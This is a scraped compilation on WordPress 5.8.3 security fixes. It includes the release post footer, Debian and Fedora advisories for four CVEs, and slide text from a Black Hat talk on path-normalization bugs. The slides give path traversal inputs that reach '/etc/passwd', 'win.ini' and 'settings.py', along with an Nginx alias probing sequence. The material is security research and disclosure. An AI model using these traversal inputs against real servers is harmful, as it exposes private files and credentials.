Thank you to all of the reporters above for [privately disclosing the vulnerabilities](https://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/). This gave the security team time to fix the vulnerabilities before WordPress sites could be attacked. Thank you to the members of the WordPress security team for implementing these fixes in WordPress.

For more information, check out the [5.8.3 HelpHub documentation page](https://wordpress.org/support/wordpress-version/version-5-8-3/).

### Thanks and props!

The 5.8.3 release was led by [@desrosj](https://profiles.wordpress.org/desrosj/) and [@circlecube](https://profiles.wordpress.org/circlecube/).

In addition to the security researchers and release squad members mentioned above, thank you to everyone who helped make WordPress 5.8.3 happen:

[Alex Concha](https://profiles.wordpress.org/xknown/), [Dion Hulse](https://profiles.wordpress.org/dd32/), [Dominik Schilling](https://profiles.wordpress.org/ocean90/), [ehtis](https://profiles.wordpress.org/ehtis/), [Evan Mullins](https://profiles.wordpress.org/circlecube/), [Jake Spurlock](https://profiles.wordpress.org/whyisjake/), [Jb Audras](https://profiles.wordpress.org/audrasjb/), [Jonathan Desrosiers](https://profiles.wordpress.org/desrosj/), [Ian Dunn](https://profiles.wordpress.org/iandunn/), [Peter Wilson](https://profiles.wordpress.org/peterwilsoncc/), [Sergey Biryukov](https://profiles.wordpress.org/sergeybiryukov/), [vortfu](https://profiles.wordpress.org/vortfu/), and [zieladam](https://profiles.wordpress.org/zieladam/).

Share this:

* [Threads](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/?share=threads&nb=1)
* [Mastodon](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/?share=mastodon&nb=1)
* [Bluesky](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/?share=bluesky&nb=1)
* [X](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/?share=x&nb=1)
* [Facebook](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/?share=facebook&nb=1)
* [LinkedIn](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/?share=linkedin&nb=1)

---

[Previous The Month in WordPress – December 2021](https://wordpress.org/news/2022/01/the-month-in-wordpress-december-2021/)
[Next WordPress 5.9 RC 2](https://wordpress.org/news/2022/01/wordpress-5-9-rc-2/)

## Get the Latest Updates

### Subscribe to WordPress News

Email Address

Subscribe

Join 18.7K other subscribers

### WP Briefing — The WordPress Podcast

Learn about where WordPress is going and how you can get involved.

* [Apple Podcasts](https://podcasts.apple.com/us/podcast/wp-briefing/id1551691710)
* [Pocket Casts](https://pca.st/uqvvmt8t)
* [RSS](https://wordpress.org/news/feed/podcast)
* [Spotify](https://open.spotify.com/show/6BxgmE9Qg2TZA8EKZLJ4zS)
* [Stitcher](https://www.stitcher.com/show/wp-briefing)

[Listen to all episodes](https://wordpress.org/news/podcast/)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from www.debian.org_07725a7b_20250108_124126.html ===


---

[[Date Prev](msg00004.html)][[Date Next](msg00006.html)]
[[Thread Prev](msg00004.html)][[Thread Next](msg00006.html)]
[[Date Index](maillist.html#00005)]
[[Thread Index](threads.html#00005)]

# [SECURITY] [DSA 5039-1] wordpress security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 5039-1] wordpress security update
* *From*: Sebastien Delafond <seb@debian.org>
* *Date*: Tue, 11 Jan 2022 10:13:25 +0000
* *Message-id*: <[[🔎]](/msgid-search/E1n7E9d-0007SX-RB%40seger.debian.org) [E1n7E9d-0007SX-RB@seger.debian.org](msg00005.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-5039-1                   security@debian.org
<https://www.debian.org/security/>                       Sebastien Delafond
January 11, 2022                      <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : wordpress
CVE ID         : CVE-2022-21661 CVE-2022-21662 CVE-2022-21663 CVE-2022-21664
Debian Bug     : 1003243

Several vulnerabilities were discovered in Wordpress, a web blogging
tool. They allowed remote attackers to perform SQL injection, run
unchecked SQL queries, bypass hardening, or perform Cross-Site
Scripting (XSS) attacks.

For the oldstable distribution (buster), these problems have been fixed
in version 5.0.15+dfsg1-0+deb10u1.

For the stable distribution (bullseye), these problems have been fixed in
version 5.7.5+dfsg1-0+deb11u1.

We recommend that you upgrade your wordpress packages.

For the detailed security status of wordpress please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/wordpress>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEAqSkbVtrXP4xJMh3EL6Jg/PVnWQFAmHdSCUACgkQEL6Jg/PV
nWTjaAgAw5g913TqTXAvlzsCDGfFItlDFx/wGhAwyMdrHsapmXBQiUixjKuINAzh
UaRgcH1DGvDu68QVupg9dtV8cvcIRocsofw9DMsjZdFjYakQULsooaff+IE8f0Oa
PqQcQYo5c+3CYQ2gMFEeaS8QH8fMc5g/OrDfltEzqWjratk7pbOCTruASW5XO8+j
Jf/qJ1buGdNJK7UskXLqoeQ0y2bMsXbDd5Hk6ktzw13WJbwT/0D26e/MK7y8F7ZH
4R6PFYnzwhHklxaU+sJwreWgVOiK/bsGONhtgWQcYYVsOEZGKO3IKiniSIuaydKf
nYf5qUFDxoSGsj1YtFx2WWQVfi2Jhw==
=whm3
-----END PGP SIGNATURE-----

```

---



=== Content from lists.fedoraproject.org_90660800_20250108_124124.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/CV4UNEC63UU5GEU47IIR4RMTZAHNEOJG/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/CV4UNEC63UU5GEU47IIR4RMTZAHNEOJG/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/CV4UNEC63UU5GEU47IIR4RMTZAHNEOJG/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/CV4UNEC63UU5GEU47IIR4RMTZAHNEOJG/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-CV4UNEC63UU5GEU47IIR4RMTZAHNEOJG.mbox.gz?message=CV4UNEC63UU5GEU47IIR4RMTZAHNEOJG "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/CV4UNEC63UU5GEU47IIR4RMTZAHNEOJG/#CV4UNEC63UU5GEU47IIR4RMTZAHNEOJG)

# [SECURITY] Fedora 34 Update: wordpress-5.8.3-1.fc34

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

15 Jan
2022

15 Jan
'22

6:58 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2022-e37e1e6c7a
2022-01-16 00:57:03.087605
--------------------------------------------------------------------------------

Name : wordpress
Product : Fedora 34
Version : 5.8.3
Release : 1.fc34
URL : <http://www.wordpress.org>
Summary : Blog tool and publishing platform
Description :
Wordpress is an online publishing / weblog package that makes it very easy,
almost trivial, to get information out to people on the web.

Important information in /usr/share/doc/wordpress/README.fedora

--------------------------------------------------------------------------------
Update Information:

\*\*Security Updates\*\* Four security issues affect WordPress versions between 3.7
and 5.8. If you haven���t yet updated to 5.8, all WordPress versions since 3.7
have also been updated to fix the following security issue (except where noted
otherwise): \* Props to Karim El Ouerghemmi and Simon Scannell of SonarSource
for disclosing an issue with stored XSS through post slugs. \* Props to Simon
Scannell of SonarSource for reporting an issue with Object injection in some
multisite installations. \* Props to ngocnb and khuyenn from GiaoHangTietKiem
JSC for working with Trend Micro Zero Day Initiative on reporting a SQL
injection vulnerability in WP\_Query. \* Props to Ben Bidner from the WordPress
security team for reporting a SQL injection vulnerability in WP\_Meta\_Query (only
relevant to versions 4.1-5.8).
--------------------------------------------------------------------------------
ChangeLog:

\* Fri Jan 7 2022 Remi Collet remi@remirepo.net - 5.8.3-1
- WordPress 5.8.3 Security Release
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2039301 - CVE-2022-21661 wordpress: SQL injection via WP\_Query
<https://bugzilla.redhat.com/show_bug.cgi?id=2039301>
[ 2 ] Bug #2039306 - CVE-2022-21662 wordpress: stored XSS through authenticated users
<https://bugzilla.redhat.com/show_bug.cgi?id=2039306>
[ 3 ] Bug #2039312 - CVE-2022-21663 wordpress: authenticated object injection in multisites
<https://bugzilla.redhat.com/show_bug.cgi?id=2039312>
[ 4 ] Bug #2039317 - CVE-2022-21664 wordpress: SQL injection due to improper sanitization in WP\_Meta\_Query
<https://bugzilla.redhat.com/show_bug.cgi?id=2039317>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2022-e37e1e6c7a' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/CV4UNEC63UU5GEU47IIR4RMTZAHNEOJG/#CV4UNEC63UU5GEU47IIR4RMTZAHNEOJG)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from i.blackhat.com_96ea5711_20250108_153635.html ===
Breaking Parser Logic!

Take Your Path Normalization Off and Pop 0days Out

Orange Tsai

Orange Tsai

• Security researcher at DEVCORE

• HITCON - Hacks in Taiwan

orange_8361

Agenda

1. The blind side of path normalization

2.

In-depth review of existing implementations

3. New multi-layered architecture attack surface

Normalize

To make standard; determine the value by comparison to

an item of known standard value

Why normalization?

To protect something

Inconsistency

if (check(data)) {
use(data)

}

Windows treat as UNC

new URL("file:///etc/passwd?/../../Windows/win.ini")

Linux treat as URL

Polyglot URL path

• Rely on getPath() under Windows

URL base = new URL("file:///C:/Windows/temp/");
URL url = new URL(base, "file?/../../win.ini");

• Rely on normalization of getFile() or toExternalForm() under Linux

URL base = new URL("file:///tmp/");
URL url  = new URL(base, "../etc/passwd?/../../tmp/file");

Why path normalization

• Most website handle files(and apply lots of security mechanism)

• Lack of overall security review

• Code change too fast, does the patch and protection still work?

A 5 years Mojarra story

From JavaServer Faces CVE-2013-3827 to CVE-2018-14371

How parsers could be failed?

Can you spot the vulnerability?

static String QUOTED_FILE_SEPARATOR = Pattern.quote(File.separator)

static String DIRECTIVE_FILE_SEPARATOR = '/'

public AssetFile getAsset(String relativePath) {

if(!relativePath)

return null

relativePath = relativePath.replace( QUOTED_FILE_SEPARATOR,

DIRECTIVE_FILE_SEPARATOR)

replace v.s. replaceAll

String replace(String target, String replacement)

String replaceAll(String regex, String replacement)

Can you spot the vulnerability?

static String QUOTED_FILE_SEPARATOR = Pattern.quote(File.separator)

static String DIRECTIVE_FILE_SEPARATOR = '/'

public AssetFile getAsset(String relativePath) {

Pattern.quote("/") = "\Q/\E"

if(!relativePath)

return null

relativePath = relativePath.replace( QUOTED_FILE_SEPARATOR,

DIRECTIVE_FILE_SEPARATOR)

..\Q/\E is the new  ../ in Grails

/app/static/ v.s. /app/static

How single slash could be failed?

Nginx off-by-slash fail

• First shown in the end of 2016 HCTF - credit to @iaklis

• A good attack vector but very few people know

• Nginx says this is not their problem

• Nginx alias directive

• Defines a replacement for the specified location

Nginx off-by-slash fail

http://127.0.0.1/static../settings.py

location /static {

alias /home/app/static/;

}

Nginx matches the rule and appends the remainder to destination
/home/app/static/../settings.py

How to find this problem?

• Discovered in a private bug bounty program and got the

maximum bounty

200

403

404

403

200

200

http://target/assets/ app.js

http://target/assets/

http://target/assets/../settings.py

http://target/assets../

http://target/assets../static/app.js

http://target/assets../settings.py

0days I found

CVE

Spring Framework

CVE-2018-1271

Spark Framework

CVE-2018-9159

Jenkins

Mojarra

